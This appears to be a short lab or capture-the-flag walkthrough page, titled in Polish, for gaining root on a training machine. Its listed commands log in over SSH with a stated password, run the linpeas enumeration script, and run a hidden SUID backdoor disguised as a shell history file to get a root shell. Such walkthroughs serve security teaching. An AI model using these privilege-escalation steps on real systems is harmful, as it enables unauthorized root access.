---
title: "7.4 - System 1 - ukryta powłoka z SUID"
order: 4
---

```bash
ssh system1@192.168.100.107 -p 2201 #Password: pjatk
ls -la
bash linpeas.sh #Check SUID files
./.zsh_history #Hidden SUID backdoor (root shell)
/root/solve
```
